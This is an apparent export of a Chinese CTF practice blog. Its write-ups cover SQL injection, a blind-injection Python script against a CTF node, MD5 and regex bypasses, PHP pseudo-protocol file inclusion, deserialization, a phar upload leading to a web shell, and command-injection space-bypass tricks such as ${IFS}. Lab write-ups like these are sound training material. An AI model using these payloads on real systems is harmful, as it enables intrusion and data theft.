class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1;</span><br></code></pre></td></tr></table></figure><p>使用这个的原因是，我们没有指定flag(word)对应的id，所以只要为真就能xian’shi</p><h1 id="CISCN-2019华北Day2-Web1"><a href="#CISCN-2019华北Day2-Web1" class="headerlink" title="[CISCN 2019华北Day2]Web1"></a>[CISCN 2019华北Day2]Web1</h1><p>0x01</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">blind_injection</span>(<span class="hljs-params">url</span>):<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>strings = string.printable<br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">60</span>):<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strings:<br>payload = <span class="hljs-string">&#x27;(select(ascii(mid(flag,&#123;0&#125;1,))=&#123;1&#125;)from(flag))&#x27;</span>.<span class="hljs-built_in">format</span>(num,<span class="hljs-built_in">ord</span>(i)) <span class="hljs-comment"># 查询字段名，是否是正确的</span><br>post_data = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>res = requests.post(url=url,data=post_data)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Hello&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>flag += i<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(flag)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>url = <span class="hljs-string">&#x27;http://node4.anna.nssctf.cn:28673/index.php&#x27;</span><br>blind_injection(url)<br><br></code></pre></td></tr></table></figure><p>0x02</p><p>基本思路就是，使用bool盲注的方式获取字段里面的值</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>md5</title>
    <link href="/2024/01/07/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/md5/"/>
    <url>/2024/01/07/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/md5/</url>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF-2020-easy-md5"><a href="#BJDCTF-2020-easy-md5" class="headerlink" title="[BJDCTF 2020]easy_md5"></a>[BJDCTF 2020]easy_md5</h1><p>**0x00  **</p><p>这道题对我来说收获很多</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/md5/image-20240107111226559.png" alt="image-20240107111226559"></p><p>首先反应是万能密码，但是试过了没有用，就F12，抓包查找信息</p><p>我是用bp的时候发现有一个请求头</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/md5/image-20240107111356004.png" alt="image-20240107111356004"></p><p>这里我是直接抄的wp</p><blockquote><p>ffifdyop</p></blockquote><p>然后就到了第二关</p><p><strong>0x01</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/md5/image-20240107112239625.png" alt="image-20240107112239625"></p><p>查看源码，直接使用数组绕过</p><p><strong>0x02</strong></p><p>到了第三关，我还是使用的是数组绕过</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/md5/image-20240107112440394.png" alt="image-20240107112440394"></p><p>只是要注意这个是post</p><p><strong>0x03</strong></p><p>整体难度不大，但是第一个绕过还是有点迷糊</p><p>现在是记住就行</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2024/01/05/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2024/01/05/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPUCTF-2021-新生赛-PseudoProtocols"><a href="#SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="[SWPUCTF 2021 新生赛]PseudoProtocols"></a>[SWPUCTF 2021 新生赛]PseudoProtocols</h1><p>**0x00  **</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240105221129539.png" alt="image-20240105221129539"></p><p>file_get_contents()</p><p>这个函数就会将内容读取出来，然后转变为字符串</p><p><strong>0x01 绕过</strong></p><p>这个函数有两个方式绕过</p><blockquote><p>php:&#x2F;&#x2F;input</p></blockquote><p>然后在post里面添加内容</p><blockquote><p>I want flag</p></blockquote><p>还有一个方法是data</p><blockquote><p>data:&#x2F;&#x2F;text&#x2F;plain,I want flag</p></blockquote><p>​</p><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>**0x00  **</p><p>这道题用到的主要使用伪协议</p><p><strong>0x01</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240107095634950.png" alt="image-20240107095634950"></p><p>我们需要先绕过这个，还是伪协议，和上面那一道题是一样的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240107095812819.png" alt="image-20240107095812819"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">data:<span class="hljs-regexp">//</span>text/plain<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240107095853088.png" alt="image-20240107095853088"></p><p><strong>0x02</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240107095925922.png" alt="image-20240107095925922"></p><p>根据提示使用伪协议读取useless.php文件内容，由于这个对flag会有过滤，我们就使用base64加密一下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240107101022664.png" alt="image-20240107101022664"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain,welcome to the zjctf&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure><p>然后解密base64</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240107101126165.png" alt="image-20240107101126165"></p><p><strong>0x03</strong></p><p>反序列化出flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240107101355638.png" alt="z"></p><p>查看源码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240107101409393.png" alt="image-20240107101409393"></p><h1 id="鹏城杯-2022-简单包含"><a href="#鹏城杯-2022-简单包含" class="headerlink" title="[鹏城杯 2022]简单包含"></a>[鹏城杯 2022]简单包含</h1><p><strong>0x00</strong> </p><p>主要使用的是php伪协议，然后脏数据绕过</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240110110712603.png" alt="image-20240110110712603"></p><p><strong>0x01</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240110110904685.png" alt="image-20240110110904685"></p><p>有waf，读取源码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240110111053522.png" alt="image-20240110111053522"></p><p><strong>0x02</strong></p><p>看长度是否大于800</p><p>构造一个脏数据大于800</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240110111555228.png" alt="image-20240110111555228"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240110111609419.png" alt="image-20240110111609419"></p><h1 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h1><p><strong>0x00</strong></p><p>主要思路：</p><p>绕过正则匹配就行了</p><p>关键点：</p><ol><li>basename()函数，会忽视非ascii码值，返回上一个<code>/</code>的字符</li><li><code>_</code>绕过可以使用<code>.</code>和<code>[</code></li></ol><p>新东西：</p><p>直接看输出吧</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240110134837890.png" alt="image-20240110134837890"></p><p>总结一下</p><ol><li><p>$_SERVER[‘PHP_SELF’]</p><p>url之后的输出路径</p></li><li><p>$_SERVER[‘REQUEST_URI’]</p><p>输出路径，如果有参数会输出参数</p></li><li><p>basename</p><p>输出最后一个\后面的东西</p><p><a href="https://www.runoob.com/php/func-filesystem-basename.html">PHP basename() 函数 | 菜鸟教程 (runoob.com)</a></p></li></ol><p><strong>0x01</strong></p><p>现在开始分析</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240110140903859.png" alt="image-20240110140903859"></p><p>经过分析，发现存在矛盾，但是我们看可以利用<code>basename()</code>函数，的特性</p><blockquote><p>basename()会忽视非ascii码值</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240110141110374.png" alt="image-20240110141110374"></p><p><strong>0x02</strong></p><p>现在可以知道，我们只需要构建一个含有非ascii码值的就可以了</p><p>但是我们会指定路径，所以我们需要在index.php下弄，还有就是绕过show_source可以使用<code>show.source</code>和<code>show[source</code>绕过</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240110141402640.png" alt="image-20240110141402640"></p><blockquote><p>index.php&#x2F;utils.php&#x2F;%88?show[source&#x3D;</p></blockquote><h1 id="NISACTF-2022-bingdundun"><a href="#NISACTF-2022-bingdundun" class="headerlink" title="[NISACTF 2022]bingdundun~"></a>[NISACTF 2022]bingdundun~</h1><p>0x00</p><p>都是冰墩墩的错误</p><p>使用的知识点</p><ol><li><p>zip上传之后，使用phar协议进行文件包含</p><p><a href="https://www.freebuf.com/articles/web/182231.html">PHP phar：协议对象注入技术介绍 - FreeBuf网络安全行业门户</a></p></li></ol><p>0x01</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240124182307436.png" alt="image-20240124182307436"></p><p>点击</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240124182332441.png" alt="image-20240124182332441"></p><p>发现出现了参数提示</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240124182527859.png" alt="image-20240124182527859"></p><p>又发现了一个隐藏信息</p><p>现在基本理解的，就是上传zip然后进行连接</p><p>0x02</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240124182942056.png" alt="image-20240124182942056"></p><p>上传了zip得到了路径</p><p><a href="https://www.freebuf.com/articles/web/182231.html">PHP phar：协议对象注入技术介绍 - FreeBuf网络安全行业门户</a></p><p>0x03</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240124183233707.png" alt="image-20240124183233707"></p><p>红框中是php文件名字</p><p>0x04</p><p>连接</p><p>antsword</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240124183339835.png" alt="image-20240124183339835"></p><p>flag在根目录</p><p>总结</p><p>学到了新的php伪协议的用法</p><h1 id="HNCTF-2022-WEEK2-easy-include"><a href="#HNCTF-2022-WEEK2-easy-include" class="headerlink" title="[HNCTF 2022 WEEK2]easy_include"></a>[HNCTF 2022 WEEK2]easy_include</h1><p>这道题比较有意思，学到了</p><p>0x00 </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212215957836.png" alt="image-20240212215957836"></p><p>出现了这个，我开始以为是绕过限制，然后文件包含</p><p>但是发现隔离了太多了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212220049077.png" alt="image-20240212220049077"></p><p>发现能包含</p><p>0x01</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212220440107.png" alt="image-20240212220440107"></p><p>这里暴露了中间件的信息</p><p>0x02</p><p>尝试日志文件包含</p><p>就是apache  ngnix 日志文件</p><blockquote><p>日志包含漏洞属于是本地文件包含，同样服务器没有很好的过滤，或者是服务器配置不当导致用户进入了内网，本来常规用户是访问不了这些文件的，但由于发起访问请求的人是服务器本身，也就导致用户任意文件读取</p><p>apache服务器日志存放文件位置：&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p><p>nginx服务器日志存放位置：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log和&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212222544856.png" alt="image-20240212222544856"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>其他</title>
    <link href="/2024/01/04/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E5%85%B6%E4%BB%96/"/>
    <url>/2024/01/04/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E5%85%B6%E4%BB%96/</url>
    
    <content type="html"><![CDATA[<h1 id="第五空间-2021-WebFTP"><a href="#第五空间-2021-WebFTP" class="headerlink" title="[第五空间 2021]WebFTP"></a>[第五空间 2021]WebFTP</h1><p><strong>0x00  记录，没有过思路</strong></p><p>这道题的话，还是很好理解的，但是思路要对</p><p><strong>0x01  这个项目在githb上面有源码</strong></p><p>既然存在源码，就可以找到对应的初始密码试一下</p><p><strong>0x02 找文件</strong></p><p>登录之后就是找文件，看是否存在flag</p><p><strong>0x03  总结</strong></p><p>这道题，找文件比较难难受，最后看的wp<br>但是可以查找源码，可以参考一下</p><h1 id="NISACTF-2022-checkin"><a href="#NISACTF-2022-checkin" class="headerlink" title="[NISACTF 2022]checkin"></a>[NISACTF 2022]checkin</h1><p><strong>0x00</strong></p><p>学到了url加密本质就是使用16进制</p><p><a href="https://cloud.tencent.com/developer/article/2308496">URL编码解码详解，看这一篇就够够的了-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><strong>0x01</strong></p><p>还是先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-comment">// ‮⁦NISACTF⁩⁦Welcome to</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;jitanglailo&quot;</span> == <span class="hljs-variable">$_GET</span>[ahahahaha] &amp;‮⁦+!!⁩⁦&amp; <span class="hljs-string">&quot;‮⁦ Flag!⁩⁦N1SACTF&quot;</span> == <span class="hljs-variable">$_GET</span>[‮⁦Ugeiwo⁩⁦cuishiyuan]) &#123; <span class="hljs-comment">//tnnd! weishenme b</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$FLAG</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>直接相等就能过了，好耶</p><p>但是我传了很多遍都是不行的，所以一定存在问题，将源码放入到vscode里面</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115192247871.png" alt="image-20240115192247871"></p><p>发现存在不可见的字符，然后我就尝试获取16进制，然后进行url加密应该就可以</p><p><strong>0x02</strong></p><p>放入010</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115192352867.png" alt="image-20240115192352867"></p><p>使用脚本加密</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115192509874.png" alt="image-20240115192509874">最后手动添加一个%</p><p>如果懒的话可以尝试下面这个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115192602415.png" alt="image-20240115192602415"></p><p>记住还有参数也是需要的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115192636860.png" alt="image-20240115192636860"></p><h1 id="SWPUCTF-2022-新生赛-js-sign"><a href="#SWPUCTF-2022-新生赛-js-sign" class="headerlink" title="[SWPUCTF 2022 新生赛]js_sign"></a>[SWPUCTF 2022 新生赛]js_sign</h1><p>0x00</p><p>这道题挺新奇的</p><p>利用的知识点</p><ol><li>tapcode</li></ol><p>0x01</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240129201039697.png" alt="image-20240129201039697"></p><p>将base64解码获得<code>tapcode</code>提示我们使用tapcode</p><p>将falg空格去掉</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240129201152040.png" alt="image-20240129201152040"></p><p>去除空格还可以使用去掉空格之后拼接起来</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>rce</title>
    <link href="/2024/01/04/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/rce/"/>
    <url>/2024/01/04/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/rce/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h1><p><strong>0X00 被坑了</strong></p><p>这道题看见了eval()函数，这个函数可以把字符串当做php代码执行，但是….</p><p><a href="https://www.runoob.com/php/func-misc-eval.html">PHP eval() 函数 | 菜鸟教程 (runoob.com)</a></p><p><strong>0x01  system &amp;&amp; shell_eval</strong></p><p>直接尝试运行代码，读取flag</p><blockquote><p>cat &#x2F;f*</p></blockquote><p>但是这个时候我是用shell_eval()没有任何反应</p><p>当我开始迷茫的时候尝试使用system()执行，出答案</p><p><strong>0x02  区别</strong></p><blockquote><p>shell_exec() 将执行结果当作返回值，并不会主动输出，而是赋值给变量</p></blockquote><blockquote><p>system() 执行命令，并输出到浏览器</p></blockquote><h1 id="SWPUCTF-2021-新生赛-babyrce"><a href="#SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]babyrce"></a>[SWPUCTF 2021 新生赛]babyrce</h1><p><strong>0x00  这道题的前门很简单，直接访问就可以了</strong></p><p>然后出现了一个文件，接着访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240104221824671.png" alt="image-20240104221824671"></p><p>空格绕过</p><p><strong>0x01 写本wp的主要目的</strong></p><p>一起学习一下空格绕过的几种方法</p><blockquote><ol><li>%09(tap)</li><li>%20(space)</li><li>${IFS}</li><li>$IFS$9</li><li>&lt;</li><li>&gt;</li><li>&#x2F;**&#x2F;注释也是可以绕过的</li></ol></blockquote><h1 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h1><p><strong>0x00</strong></p><p>这道题总体来说还是比较简单，用到的知识点是空格绕过和变量绕过</p><p><strong>0x01</strong> </p><h1 id="SWPUCTF-2021-新生赛-hardrce"><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h1><p>0x00</p><p>这道题比较惊奇，学到了取反绕过</p><p>0x01</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107221731062.png" alt="image-20240107221731062"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$wllm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>];<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;\t&#x27;</span>,<span class="hljs-string">&#x27;\r&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\+&#x27;</span>,<span class="hljs-string">&#x27;\[&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;\-&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\*&#x27;</span>,<span class="hljs-string">&#x27;\?&#x27;</span>,<span class="hljs-string">&#x27;\&lt;&#x27;</span>,<span class="hljs-string">&#x27;\&gt;&#x27;</span>,<span class="hljs-string">&#x27;\=&#x27;</span>,<span class="hljs-string">&#x27;\`&#x27;</span>,];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$wllm</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span 